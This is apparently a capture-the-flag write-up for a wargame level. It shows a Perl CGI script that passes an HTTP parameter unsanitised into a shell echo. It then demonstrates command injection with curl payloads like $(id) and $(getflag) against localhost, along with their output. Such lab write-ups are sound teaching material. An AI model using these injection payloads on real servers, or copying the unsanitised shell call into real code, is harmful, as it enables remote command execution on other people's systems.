# Level 04

## Initial Context

- A single perl file: `level04.pl`

## Solving the Challenge

### Analyzing

The file contains:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

It's a CGI file that is being executed when someone does a HTTP request to `localhost:4747`.

Looking at the code, we can see that it expects a `x` parameter and simply returns the value of `x`. 

```bash
$ curl http://localhost:4747?x=hello+world
hello world
```

:warning: This script is dangerous since it executes the `echo` command without any sanitization.

### Exploiting

Let's use a sub-shell to execute any command we want.

By using `x = $(<command>)`, we can execute arbitrary commands on the server side with the privileges of the server.

Using the `id` command, we can see which user has started the server.

```bash
$ curl localhost:4747?x=\$\(id\)
uid=3004(flag04) gid=2004(level04) groups=3004(flag04),1001(flag),2004(level04)
```

Using the `getflag` command, we can get the flag.

```bash
$ curl localhost:4747?x=\$\(getflag\)
Check flag.Here is your token : ....
```

Its the same as the previous level. We do not have a flag, but the password to go to the next level directly.